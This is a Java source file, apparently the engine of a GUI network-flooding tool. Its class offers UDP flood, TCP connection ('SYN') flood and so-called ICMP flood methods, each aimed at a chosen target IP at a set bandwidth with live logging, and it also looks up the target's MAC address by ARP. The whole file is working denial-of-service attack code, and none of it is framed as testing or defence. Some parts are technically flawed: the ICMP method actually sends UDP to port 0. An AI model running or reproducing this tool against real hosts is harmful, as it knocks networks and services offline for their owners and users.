package com.yourpackage;

import java.net.DatagramSocket;
import java.net.DatagramPacket;
import java.net.InetAddress;
import java.util.logging.Logger;
import java.net.Socket;
import java.io.OutputStream;
import javafx.scene.control.TextArea;
import javafx.application.Platform;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.io.File;
import java.util.concurrent.ThreadLocalRandom;
import java.net.InetSocketAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.util.Enumeration;
import org.jnetpcap.*;
import org.jnetpcap.packet.*;
import org.jnetpcap.packet.format.*;
import org.jnetpcap.protocol.*;
import org.jnetpcap.protocol.network.*;
import org.jnetpcap.protocol.tcpip.*;
import java.nio.ByteBuffer;
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class Jenkins {
    private static final Logger logger = Logger.getLogger(Jenkins.class.getName());
    private volatile boolean stopAttack = false;
    private TextArea logArea;
    private String sourceIp;
    private byte[] sourceMac;

    // Constructor
    public Jenkins() {
        // Initialize any required resources
    }

    // Method to set the log area
    public void setLogArea(TextArea logArea) {
        this.logArea = logArea;
    }

    // UDP Flood method
    public void udpFlood(String targetIp, int targetPort, int targetMbps, ChartUpdateCallback chartCallback) {
        log("Starting UDP flood attack on " + targetIp + ":" + targetPort + " at " + targetMbps + " Mbps");
        stopAttack = false;

        try (DatagramSocket socket = new DatagramSocket()) {
            InetAddress targetAddress = InetAddress.getByName(targetIp);
            byte[] buffer = new byte[1400]; // Adjust packet size if needed
            DatagramPacket packet = new DatagramPacket(buffer, buffer.length, targetAddress, targetPort);

            long startTime = System.currentTimeMillis();
            long bytesSent = 0;
            int packetsSent = 0;
            long targetBytesPerSecond = targetMbps * 125000L; // Convert Mbps to bytes per second
            long initialStartTime = startTime;

            while (!stopAttack) {
                long currentTime = System.currentTimeMillis();
                long elapsedTime = currentTime - startTime;

                if (elapsedTime >= 1000) {
                    double actualMbps = (bytesSent * 8.0 / (1024 * 1024)) / (elapsedTime / 1000.0);
                    log(String.format("Sent %d packets, %.2f MB, %.2f Mbps", packetsSent, bytesSent / (1024.0 * 1024), actualMbps));
                    
                    double elapsedTimeSeconds = (System.currentTimeMillis() - initialStartTime) / 1000.0;
                    chartCallback.update(elapsedTimeSeconds, actualMbps);
                    
                    startTime = currentTime;
                    bytesSent = 0;
                    packetsSent = 0;
                }

                socket.send(packet);
                bytesSent += buffer.length;
                packetsSent++;

                // Calculate sleep time to maintain the target rate
                long expectedBytesSent = (elapsedTime * targetBytesPerSecond) / 1000;
                if (bytesSent > expectedBytesSent) {
                    long sleepTime = (bytesSent - expectedBytesSent) * 1000 / targetBytesPerSecond;
                    if (sleepTime > 0) {
                        Thread.sleep(sleepTime);
                    }
                }
            }
        } catch (Exception e) {
            log("Error in UDP flood: " + e.getMessage());
        }
        log("UDP flood attack stopped");
    }

    // TCP SYN Flood method
    public void tcpSynFlood(String targetIp, int targetPort, int targetMbps, ChartUpdateCallback chartCallback) {
        log("Starting TCP SYN flood attack on " + targetIp + ":" + targetPort + " at " + targetMbps + " Mbps");
        stopAttack = false;

        long startTime = System.currentTimeMillis();
        long bytesSent = 0;
        int packetsSent = 0;
        long targetBytesPerSecond = targetMbps * 125000L; // Convert Mbps to bytes per second
        long initialStartTime = startTime;

        try {
            InetAddress targetAddress = InetAddress.getByName(targetIp);
            
            while (!stopAttack) {
                try (Socket socket = new Socket()) {
                    socket.connect(new InetSocketAddress(targetAddress, targetPort), 1);
                    // We only need to initiate the connection, not complete it
                    socket.close();

                    bytesSent += 54; // Approximate size of a SYN packet
                    packetsSent++;

                    long currentTime = System.currentTimeMillis();
                    long elapsedTime = currentTime - startTime;

                    if (elapsedTime >= 1000) {
                        double actualMbps = (bytesSent * 8.0 / (1024 * 1024)) / (elapsedTime / 1000.0);
                        log(String.format("Sent %d SYN packets, %.2f MB, %.2f Mbps", packetsSent, bytesSent / (1024.0 * 1024), actualMbps));
                        
                        double elapsedTimeSeconds = (currentTime - initialStartTime) / 1000.0;
                        chartCallback.update(elapsedTimeSeconds, actualMbps);
                        
                        startTime = currentTime;
                        bytesSent = 0;
                        packetsSent = 0;
                    }

                    // Rate limiting
                    long expectedPacketsSent = (elapsedTime * targetBytesPerSecond) / (54 * 1000);
                    if (packetsSent > expectedPacketsSent) {
                        long sleepTime = (packetsSent - expectedPacketsSent) * 54 * 1000 / targetBytesPerSecond;
                        if (sleepTime > 0) {
                            Thread.sleep(sleepTime);
                        }
                    }
                }
            }
        } catch (Exception e) {
            log("Error in TCP SYN flood: " + e.getMessage());
            e.printStackTrace();
        }
        log("TCP SYN flood attack stopped");
    }

    // ICMP Flood method
    public void icmpFlood(String targetIp, int bytesPerSecond) {
        log("Starting ICMP flood attack on " + targetIp + " at " + bytesPerSecond + " bytes/second");
        stopAttack = false;

        try {
            InetAddress targetAddress = InetAddress.getByName(targetIp);
            byte[] buffer = new byte[64]; // ICMP header (8 bytes) + 56 bytes of data
            buffer[0] = 8; // ICMP Echo Request type

            long startTime = System.currentTimeMillis();
            long bytesSent = 0;
            int packetsSent = 0;

            while (!stopAttack) {
                try (DatagramSocket socket = new DatagramSocket()) {
                    DatagramPacket packet = new DatagramPacket(buffer, buffer.length, targetAddress, 0);
                    socket.send(packet);
                    bytesSent += buffer.length;
                    packetsSent++;

                    if (packetsSent % 1000 == 0) {
                        long elapsedTime = System.currentTimeMillis() - startTime;
                        double actualMbps = (bytesSent * 8.0 / (1024 * 1024)) / (elapsedTime / 1000.0);
                        log(String.format("Sent %d ICMP packets, %.2f MB, %.2f Mbps", packetsSent, bytesSent / (1024.0 * 1024), actualMbps));
                    }

                    // Rate limiting
                    if (bytesSent >= bytesPerSecond) {
                        long elapsedTime = System.currentTimeMillis() - startTime;
                        if (elapsedTime < 1000) {
                            Thread.sleep(1000 - elapsedTime);
                        }
                        startTime = System.currentTimeMillis();
                        bytesSent = 0;
                    }
                }
            }
        } catch (Exception e) {
            log("Error in ICMP flood: " + e.getMessage());
        }
        log("ICMP flood attack stopped");
    }

    // Method to stop the attack
    public void stopAttack() {
        stopAttack = true;
        log("Stop attack flag set to true");
    }

    // Method to reset the attack
    public void resetAttack() {
        stopAttack = false;
        log("Attack state reset");
    }

    // Method to log a message
    private void log(String message) {
        logger.info(message);
        if (logArea != null) {
            Platform.runLater(() -> {
                logArea.appendText(LocalDateTime.now().format(DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss")) + " - " + message + "\n");
            });
        }
    }

    public String getMacAddress(String targetIp) {
        try {
            InetAddress targetAddress = InetAddress.getByName(targetIp);
            byte[] mac = getDestinationMacAddress(targetAddress);
            if (mac == null) {
                log("MAC address could not be retrieved.");
                return null;
            }
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < mac.length; i++) {
                sb.append(String.format("%02X%s", mac[i], (i < mac.length - 1) ? "-" : ""));
            }
            String macAddress = sb.toString();
            log("MAC address retrieved: " + macAddress);
            return macAddress;
        } catch (Exception e) {
            log("Error retrieving MAC address: " + e.getMessage());
            return null;
        }
    }

    public interface ChartUpdateCallback {
        void update(double elapsedTimeSeconds, double actualMbps);
    }

    public void setSourceIp(String sourceIp) {
        this.sourceIp = sourceIp;
    }

    public void setSourceMac(byte[] sourceMac) {
        this.sourceMac = sourceMac;
    }

    private byte[] getDestinationMacAddress(InetAddress targetAddress) {
        try {
            String targetIp = targetAddress.getHostAddress();
            ProcessBuilder pb;
            String os = System.getProperty("os.name").toLowerCase();
            
            if (os.contains("win")) {
                pb = new ProcessBuilder("arp", "-a", targetIp);
            } else if (os.contains("mac") || os.contains("nix") || os.contains("nux")) {
                pb = new ProcessBuilder("arp", "-e", targetIp);
            } else {
                log("Unsupported operating system for ARP resolution");
                return null;
            }

            Process process = pb.start();
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                if (line.contains(targetIp)) {
                    String[] parts = line.split("\\s+");
                    for (String part : parts) {
                        if (part.matches("([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})")) {
                            return macAddressToByteArray(part);
                        }
                    }
                }
            }
            log("MAC address not found in ARP cache for IP: " + targetIp);
            return null;
        } catch (Exception e) {
            log("Error in ARP resolution: " + e.getMessage());
            return null;
        }
    }

    private byte[] macAddressToByteArray(String macAddress) {
        String[] bytes = macAddress.split("[:-]");
        byte[] macBytes = new byte[6];
        for (int i = 0; i < 6; i++) {
            Integer hex = Integer.parseInt(bytes[i], 16);
            macBytes[i] = hex.byteValue();
        }
        return macBytes;
    }
}
